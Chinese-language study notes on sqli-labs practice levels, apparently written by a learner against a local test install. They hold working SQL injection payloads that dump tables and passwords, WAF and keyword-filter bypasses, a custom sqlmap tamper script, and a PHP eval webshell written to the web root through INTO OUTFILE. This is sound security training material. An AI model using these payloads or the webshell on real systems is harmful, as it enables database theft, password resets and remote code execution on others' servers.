## 笔记



#### **第七关**

```
?id=1'))UNION SELECT 1,2,3 into outfile "D:\\uuu.txt"--+
```

刚开始这儿一直不行，硬盘上出现不了uuu.txt，原因是自己的mysql设置问题。

在MySQL中，outfile可以用来输出一个文件。但是想要执行这样的操作，就必须要开启文件写入的权限。

我们可以执行：`show variables like '%secure%';`来查看：发现`secure_file_priv`的 value 值是 NULL，那么这代表此时文件写入的权限是关闭的，那我们需要写入输出文件的保存路径来开启它。

首先，我们来到MySQL的根目录下，会看到一个my.ini的文件。

打开my.ini文件，添加`secure_file_priv`以及他所对应的参数：（我写的是`secure_file_priv='D://'`）

注意：*路径的斜杠需要采用//需要多加一个斜杠来转义字符，其次，因为C盘的权限问题，请不要把路径写到C盘上。*【开始我没有注意这一点导致sql语句一直报错，很头疼】

之后我们重启MySQL服务：

最后重复刚才的sql语句`show variables like '%secure%';` 来查看是否修改成功：发现已经出现路径了。

那这个时候，我们就可以执行`outfile`来输出文件到 D盘的任意位置了。

```
my.ini文件是MySQL数据库服务器和客户端程序的配置文件，它可以用于设置MySQL的基本运行参数、安全性、缓存、日志记录等方面的参数。
```

> 在sql漏洞中可以使用file系列函数
>
> load_file()  ：读取指定文件
> into outfile ：将查询的数据写入文件中
> into dumpfile：将查询的数据写入文件中(只能写入一行数据)
>
> ```
> secure_file_prive=null //限制mysqld 不允许导入导出
> secure_file_priv=/path/  //限制mysqld的导入导出只能发生在默认的/path/目录下
> secure_file_priv=’’  //不对mysqld 的导入 导出做限制
> ```
>
> outfile函数可以导出多行，而dumpfile只能导出一行数据
> outfile函数在将数据写到文件里时有特殊的格式转换，而dumpfile则保持原数据格式

这时候我们可以通过`?id=-1')) union select version(),database(),user() into outfile "D:\\uuu.txt" --+`来使得所需信息输出到uuu.txt



也可以弄一些扩展的东西（通过上传一句话木马实现远程任意命令执行）

```
?id=1'))union select 1,2,'<?php @eval($_POST['a']);?>' into outfile "D:\\ProgramData\\phpstudy\\PHPTutorial\\WWW\\uuu.php"--+

蚁剑访问：http://127.0.0.1/uuu.php
```

```
<?php @eval($_POST['a']);?>
```







#### 第二十三关

第二十三关重新回到get请求，会发现输入单引号报错，但是注释符不管用。猜测注释符被过滤，看来源码果然被注释了，所以我们可以用单引号闭合，发现成功。之后可以使用联合注入。不过在判断列数时候不能使用order by 去判断需要用?id=-1' union select 1,2,3,4 or '1'='1通过不停加数字判断最后根据页面显示是三列，且显示位是2号。

```
?id=1' or '1'='1

这样sql语句就变成 id='1' or '1'='1'


?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 or '1'='1

?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' ),3 or '1'='1

?id=-1' union select 1,(select group_concat(password,username) from users),3 or '1'='1
```







#### 第二十五关

**本关主要为 or and 过滤，如何绕过 or 和 and 过滤。**

> 根据提示是将or和and这两个替换成空，但是只替换一次。大小写绕过没有用。我们可以采用双写绕过。本次关卡使用联合注入就可以了，information里面涉及or可以写成infoorrmation。

一般性提供以下几种思路： 

（1）大小写变形 Or,OR,oR 

（2）编码，hex，urlencode 

（3）添加注释/*or*/ 

（4）利用符号 and=&& or=||







#### 第二十五关

***Q：sqlmap中将`and`替换为`&&`，需要使用哪一个--tamper 绕过WAF脚本***

***A：***在SQLMap中，可以使用`--tamper`选项来使用特定的绕过WAF脚本。如果你想将`AND`替换为`&&`，你可以使用内置的`tamper`脚本`charencode`。

这将使用`charencode`脚本来编码请求中的字符，包括将`AND`替换为`&&`。



***Q：我不需要编码请求中的字符，只需要包括将AND替换为&&***

***A：***如果你只想简单地将`AND`替换为`&&`，而不进行其他字符编码或转换，你可以使用自定义的绕过脚本。以下是一个简单的绕过脚本示例，它将替换查询中的`AND`为`&&`：

```python
def tamper(payload, **kwargs):
    payload = payload.replace("AND", "&&")
    payload = payload.replace("OR", "||")
    return payload
```

将上述代码保存为`and_to_double_amp.py`（或任何你喜欢的名称），然后在SQLMap中使用`--tamper`选项指定该脚本的路径：

```
sqlmap -u <目标URL> --tamper and_to_double_amp.py
```

这将应用自定义的绕过脚本，将`AND`替换为`&&`。







#### 第二十六关

注释符以及空格给过滤了

我们需要使用单引号进行闭合，双写绕过逻辑运算符或者使用`&&`和`||`替换。空格绕过网上找了些资料，对于绕过空格限制有大把的方式对于空格，有较多的方法：

```
%09 TAB键（水平）
%0a 新建一行
%0c 新的一页
%0d return功能
%0b TAB键（垂直）
%a0 空格
```

我在windows和kali里面都用不了，可能是因为apache解析不了。只能使用()绕过。报错注入空格使用比较少所以我们可以使用报错注入。

























## 疑问



#### **第五关的疑问：**

第五关是布尔盲注，但是布尔盲注的payload肯定符合语法，只是说通过语法内容的正确与否来（是否回显固定内容），来获取信息。但是有时候如果使用错误语法的payload，也有回显。


```
?id=1' union Select 1,count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+
# 显示数据库名
```

```
?id=1' union select 1,count(*),updatexml(1,concat(0x3a,(select group_concat(column_name) from information_schema.schemata),0x3a),1)a from information_schema.columns group by a--+
# 报错：Only constant XPATH queries are supported（仅支持常量 XPATH 查询）
```







#### **第十七关的疑问：**

这一关用的使增删改部分，建议看看 *SQL 注入天书* 和后端代码

**源码：**

```php
<?php
function check_input($value) // 检查输入的账户名
{
    if (!empty($value)) // 如果账户名不为空则进行以下判断
    {
        // truncation (see comments)
        $value = substr($value, 0, 15); // 截取账户名前15的字符
    }

    // Stripslashes if magic quotes enabled
    if (get_magic_quotes_gpc()) // 该函数是都是on也就是打开，打开则进入一下判断
    // 该函数的作用是给（' " / null）特殊字符加上反斜杠转义
    //默认地，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()，（PS:也是这作用）
    {
        $value = stripslashes($value); // 删除反斜杠
    }

    // Quote if not a number
    if (!ctype_digit($value)) // uname字符串如果是非数字，则将其中的特殊字符转义
    {
        $value = "'" . mysql_real_escape_string($value) . "'"; // 函数转义 SQL 语句中使用的字符串中的特殊字符。
    } else //如果是数字
    {
        $value = intval($value); // 变成整数
    }
    return $value;
}
?>
```

==第一个疑问：==

```
1' and (extractvalue(1,concat(0x5c,(select password from (select password from users where username='admin1') b),0x5c)))#
```

注意上面代码里的“b”，如果删除则会发生错误（Every derived table must have its own alias）（每个派生表都必须有自己的别名）不懂这是为什么。

==解答：（CharGPT）==

> ***Q：为什么错误***
>
> ***A：***在你的 SQL 注入语句中，使用子查询时，每个派生表都必须有一个别名。在你的第二个语句中，你去掉了`b`，但是由于缺少别名，导致了错误。
>
> 
>
> ***Q：请详细解释为什么使用子查询时，每个派生表都必须有一个别名。***
>
> ***A：***在 SQL 查询中，派生表是在查询的 FROM 子句中使用的子查询。当你在 SQL 查询中使用子查询时，派生表（即子查询）实际上是一个临时的表，它会在查询执行时生成，并被引用于主查询中。
>
> 给派生表一个别名的原因有几个：
>
> 1. **引用字段名：** 如果你的子查询中包含了一些计算、选择或其他操作，并且你想在主查询中引用这些操作的结果，你需要为子查询创建一个别名，以便在主查询中使用这些字段。否则，数据库引擎可能无法识别字段是从哪个表（或派生表）中得到的。
>
>     ```sql
>     SELECT subquery_alias.field_name
>     FROM (SELECT some_operation AS field_name FROM your_table) AS subquery_alias;
>     ```
>
> 2. **支持多个派生表：** 如果你的查询中涉及多个派生表，为每个派生表添加别名有助于区分它们。这是因为每个表必须有唯一的名称，即使是临时生成的派生表也不例外。这有助于数据库引擎正确解释查询中每个表的引用。
>
>     ```sql
>     SELECT *
>     FROM (SELECT column1 FROM table1) AS table1_alias
>     JOIN (SELECT column2 FROM table2) AS table2_alias ON table1_alias.column1 = table2_alias.column2;
>     ```
>
> 3. **清晰可读性：** 使用别名可以使 SQL 查询更易读。它提供了对表或派生表的更具描述性的名称，使查询更易于理解和维护。
>
> 总的来说，给每个派生表添加别名是一种良好的 SQL 编码实践，有助于提高查询的可读性、维护性，并确保查询执行时引用的表是明确的。在某些情况下，数据库系统要求为每个派生表提供别名，以满足语法规范。
>
> 
>
> ***Q：那为什么 ?id=-1') union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+不需要设置别名***
>
> ***A：***在你提供的 SQL 注入语句中，是利用了 UNION 操作符，而不是子查询。在 UNION 操作符中，不需要为每个 SELECT 子句设置别名的主要原因是，UNION 的目标是合并多个查询的结果集，而不是创建派生表。在 UNION 中，结果集的列名是由第一个 SELECT 语句定义的，后续的 SELECT 语句的列名必须与第一个 SELECT 语句的列名相匹配。
>
> 具体来说，你的注入语句是这样的：
>
> ```sql
> ?id=-1') UNION SELECT 1,2,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'--+
> ```
>
> 在这里，UNION 合并了两个查询：
>
> 1. `SELECT 1,2`: 产生一个两列的结果集，列值分别为1和2。
> 2. `SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'`: 产生一个包含 users 表列名连接结果的结果集。
>
> 这两个 SELECT 语句的列数和数据类型必须匹配，而不需要为它们设置别名。数据库系统会使用第一个 SELECT 语句的列名作为整个 UNION 结果的列名。
>
> 在这种情况下，UNION 操作是将两个查询的结果集纵向合并，而不涉及子查询的概念。所以，不需要为每个 SELECT 子句设置别名。
>
> （这儿其实就是，之前都是先把后端的select语句闭合掉，然后再执行我们的 union select ）
>
> 
>
> ***Q：解释子查询语句***
>
> ***A：***子查询是一个嵌套在主查询中的查询语句。
>
> 子查询是在主查询中嵌套的查询语句，可以返回一个结果集，然后主查询可以使用这个结果集进行进一步的过滤、比较或操作。子查询通常出现在 `SELECT`、`FROM`、`WHERE` 等子句中。
>
> 例如，下面是一个使用子查询的示例：
>
> ```sql
> SELECT column1
> FROM table1
> WHERE column2 = (SELECT some_column FROM table2 WHERE condition);
> ```
>
> 在这个例子中，`(SELECT some_column FROM table2 WHERE condition)` 就是一个子查询，它返回一个值，然后主查询使用这个值进行条件过滤。
>
> 而 `AND`、`OR` 是逻辑运算符，用于连接多个条件，例如：
>
> ```sql
> SELECT *
> FROM table
> WHERE column1 = 'value' AND column2 > 10;
> ```
>
> 在这个例子中，`AND` 连接了两个条件，要求同时满足 `column1 = 'value'` 和 `column2 > 10`。
>
> 总的来说，子查询是一个嵌套在主查询中的完整查询语句，而 `AND`、`OR` 等是用于连接多个条件的逻辑运算符。
>
> (这儿我感觉和后端代码有关系，后端代码是要修改数据库内容，（先 select 匹配账户，然后 updata 修改密码）然后我们的payload拼接进去后就形成了子查询。)



==第二个疑问：==

```
1' and (extractvalue(1,concat(0x5c,(select group_concat(username,password) from users),0x5c)))#                      爆字段内容。
```

这个会报错（You can't specify target table 'users' for update in FROM clause）（不能在 FROM 子句中指定要更新的目标表“users”）

但是这个报错很正常，原因是mysql数据不支持查询和更新是同一张表。所以我们需要加一个中间表。这个关卡需要输入正确账号因为是密码重置页面，所以爆出的是该账户的原始密码。如果查询时不是users表就不会报错。

**示例：查用户名：**

```
 -1' and updatexml(1,concat(0x7e,(select group_concat(username) from users)),1) # 
```

这个会报错，但是我们可以用其他方法绕过 ，将表名users用`(select username from users)a`替换掉

```
-1' and updatexml(1,concat(0x7e,(select group_concat(username) from (select username from users)a)),1)#
```

```
-1' and updatexml(1,concat(0x7e,mid((select group_concat(username) from (select username from users)a),32,32)),1)#
```

**示例：查密码：**(仍然报错：Only constant XPATH queries are supported（仅支持常量 XPATH 查询）)

```
-1' and updatexml(1,concat(0x7e,mid((select group_concat(password) from (select username from users)a),1,32)),1)#
```

**但这一关知道用户名就可以随便改密码了呀**

（来自https://blog.csdn.net/dreamthe/article/details/123795302）

（来自https://blog.csdn.net/l2872253606/article/details/124411903）



同样，使用sqlmap：`python3 sqlmap.py -r "D:\post.txt" -D security -T users --columns --dump`

并不能成功跑出数据来，因为这儿我们跑的时候会直接给替换掉，也就是说跑出来的并不是原数据库的密码，而是替换之后的密码（后端代码本来就是先 `select` 匹配账户，然后 `updata` 修改密码）。

（你可以边让 sqlmap 跑，边刷新`Navicat`，瞅瞅数据库都遭遇了什么折磨……哎……真的是……哎）

复原的方法就是重置一下 sqli-labs 数据库

**但这一关知道用户名就可以随便改密码了呀**

// txt内容如下：

```
POST /sqli-labs/Less-17/ HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: http://127.0.0.1
Connection: close
Referer: http://127.0.0.1/sqli-labs/Less-17/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

uname=admin&passwd=asd*&submit=Submit
```



